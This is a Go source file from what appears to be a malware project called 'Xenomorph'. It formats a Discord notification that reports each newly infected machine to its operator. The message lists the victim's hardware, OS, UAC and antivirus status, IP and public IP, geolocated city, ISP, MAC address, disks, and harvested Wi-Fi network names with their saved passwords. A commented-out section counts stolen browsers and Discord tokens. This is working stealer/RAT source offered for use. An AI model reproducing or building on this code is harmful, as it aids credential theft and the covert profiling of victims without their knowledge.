package embeds

import (
	"encoding/json"
	"fmt"
	"strconv"
	"strings"

	"github.com/bwmarrin/discordgo"
	"github.com/codevault-llc/xenomorph/pkg/types"
)

const (
	ConnectionColor = 0x1E3E62
)

func ConnectionEmbed(data *types.RegistrationData) discordgo.MessageEmbed {
	var disks string
	if len(data.Disks) > 0 {
		disksJSON, err := json.Marshal(data.Disks)
		if err != nil {
			disks = "Error formatting disks"
		} else {
			disks = string(disksJSON)
		}
	} else {
		disks = "No disks found"
	}

	diskFields := SplitField("__**Disks**__", Codeblock(disks))

	messageEmbed := discordgo.MessageEmbed{
		Title: "Xenomorph **`[Connection]`**",
		Fields: []*discordgo.MessageEmbedField{
			{
				Name: "__**Computer Info**__",
				Value: Codeblock(DisplayFieldList([]Field{
					{Name: "Computer Name", Value: data.ComputerName},
					{Name: "Computer OS", Value: data.OS},
					{Name: "Computer Version", Value: data.OSVersion},
					{Name: "Total Memory", Value: strconv.FormatUint(uint64(data.TotalMemory), 10)},
					{Name: "Up Time", Value: strconv.FormatInt(data.Uptime, 10)},
					{Name: "UUID", Value: data.UUID},
					{Name: "CPU", Value: data.CPUModel},
					{Name: "GPU", Value: data.GPUModel},
					{Name: "UAC", Value: strconv.FormatBool(data.UAC)},
					{Name: "Anti Virus", Value: strconv.FormatBool(data.Antivirus)},
				})),
			},
			{
				Name: "__**Network Info**__",
				Value: Codeblock(DisplayFieldList([]Field{
					{Name: "IP Address", Value: data.IPAddress},
					{Name: "Public IP", Value: data.Geographic.IP},
					{Name: "Country", Value: data.Geographic.Country},
					{Name: "Time Zone", Value: data.Geographic.Timezone},
					{Name: "MAC Address", Value: data.MACAddress},
					{Name: "Gateway", Value: data.Gateway},
					{Name: "Subnet Mask", Value: data.SubnetMask},
					{Name: "DNS", Value: strings.Join(data.DNS, ", ")},
					{Name: "ISP", Value: data.Geographic.Org},
					{Name: "Location", Value: data.Geographic.City + ", " + data.Geographic.Region + ", " + data.Geographic.Country},
				})),
			},
			{
				Name: "__**Network Interfaces**__",
				Value: func() string {
					if len(data.NetworkInterfaces) == 0 {
						return "No network interfaces found"
					}

					var sb strings.Builder
					sb.WriteString("```plaintext\n")
					sb.WriteString(fmt.Sprintf("%-25s %-20s\n", "SSID", "PASSWORD"))
					sb.WriteString(strings.Repeat("-", 47) + "\n")

					for _, iface := range data.NetworkInterfaces {
						ssid := iface.SSID
						if ssid == "" {
							ssid = "(unknown)"
						}
						pw := iface.Password
						if pw == "" {
							pw = "(none)"
						}

						// Limit long values to avoid breaking layout
						if len(ssid) > 24 {
							ssid = ssid[:21] + "..."
						}
						if len(pw) > 19 {
							pw = pw[:16] + "..."
						}

						sb.WriteString(fmt.Sprintf("%-25s %-20s\n", ssid, pw))
					}

					sb.WriteString("```")
					return sb.String()
				}(),
			},
			/*{
				Name: "__**Apps**__",
				Value: Codeblock(DisplayFieldList([]Field{
					{Name: "Web Browsers", Value: strconv.Itoa(len(data.Webbrowsers))},
					{Name: "Discord Tokens", Value: strconv.Itoa(len(data.DiscordTokens))},
				})),
			},*/
		},
		Color: ConnectionColor,
	}

	messageEmbed.Fields = append(messageEmbed.Fields, diskFields...)

	return messageEmbed
}
